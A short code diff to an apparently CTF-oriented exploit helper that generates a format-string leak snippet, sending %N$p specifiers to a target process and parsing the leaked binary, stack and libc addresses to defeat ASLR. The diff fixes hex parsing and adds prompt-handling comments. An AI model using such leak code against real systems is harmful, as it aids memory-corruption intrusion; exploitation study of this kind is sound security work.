@@ -103,12 +103,14 @@ def leak(fmt_exec_function, elff, max_distance=100):
         print('Leak Code Example:')
         print(f"""
 format_string = b'%{binary_loc[0][0]}$p.%{stack_loc[0][0]}$p.%{libc_loc[0][0]}$p.END'\n\
+# p.recvuntil(b">>")
 p.sendline(format_string)
+# p.recvuntil(b":")
 returned = p.recvline()
 leaks = returned[{reflect_start}:returned.find(b'END')].split(b'.')
-elff.address = leaks[0] - {hex(binary_loc[0][1])}
-stack = leaks[1] - {hex(stack_loc[0][1])}
-libc.address = leaks[2] - {hex(libc_loc[0][1])}
+elff.address = int(leaks[0], 16) - {hex(binary_loc[0][1])}
+stack = int(leaks[1], 16) - {hex(stack_loc[0][1])}
+libc.address = int(leaks[2], 16) - {hex(libc_loc[0][1])}
 print('binary: ', hex(elff.address))
 print('stack: ', hex(stack))
 print('libc: ', hex(libc.address))""")
